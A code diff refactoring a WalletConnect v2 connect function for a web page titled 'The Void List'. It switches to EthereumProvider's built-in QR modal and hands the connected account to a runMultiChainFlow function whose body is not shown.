@@ -37,25 +37,15 @@ async function connectMetaMask() {
 /* --- Regular WalletConnect v2 (Sign Client) --- */
 async function connectWalletConnect() {
     try {
-        walletConnectButton.innerText = "Connecting...";
-        
-        // Import the standalone modal and provider
-        const { WalletConnectModal } = window.WalletConnectModal;
-        const { EthereumProvider } = window.EthereumProvider;
+        const walletConnectButton = document.getElementById('walletConnectButton');
+        walletConnectButton.innerText = "Loading...";
 
-        const web3Modal = new WalletConnectModal({
+        // Initialize the provider
+        wcProvider = await window.EthereumProvider.init({
             projectId: WC_PROJECT_ID,
-            chains: [1] // Ethereum Mainnet
-        });
-
-        const wcProvider = await EthereumProvider.init({
-            projectId: WC_PROJECT_ID,
-            showQrModal: true,
-            qrModalOptions: { themeMode: "dark" },
-            chains: [1], // Required
-            optionalChains: [56, 137, 42161], // Optional (BSC, Polygon, Arbitrum)
-            methods: ["eth_sendTransaction", "personal_sign", "wallet_switchEthereumChain"],
-            events: ["chainChanged", "accountsChanged"],
+            chains: [1],
+            optionalChains: [56, 137, 42161],
+            showQrModal: true, // This is the magic part for the QR code
             metadata: {
                 name: 'The Void List',
                 description: 'Project Verification',
@@ -64,21 +54,26 @@ async function connectWalletConnect() {
             }
         });
 
-        // Trigger connection
+        // Add event listeners for connection
+        wcProvider.on("display_uri", (uri) => {
+            console.log("QR Code URI generated");
+        });
+
+        // Trigger the QR Modal
         await wcProvider.connect();
 
         provider = new ethers.providers.Web3Provider(wcProvider);
         signer = provider.getSigner();
         const accounts = await provider.listAccounts();
 
-        walletModal.classList.add('hidden');
+        document.getElementById('walletModal').classList.add('hidden');
         await runMultiChainFlow(accounts[0]);
 
     } catch (e) {
-        console.error("WC Connection Error:", e);
-        if (!e.message.includes("closed")) alert("Connection failed. Please retry.");
+        console.error("QR Modal Error:", e);
+        alert("Could not open WalletConnect. Please check your internet or Project ID.");
     } finally {
-        walletConnectButton.innerText = "WalletConnect";
+        document.getElementById('walletConnectButton').innerText = "WalletConnect";
     }
 }
 
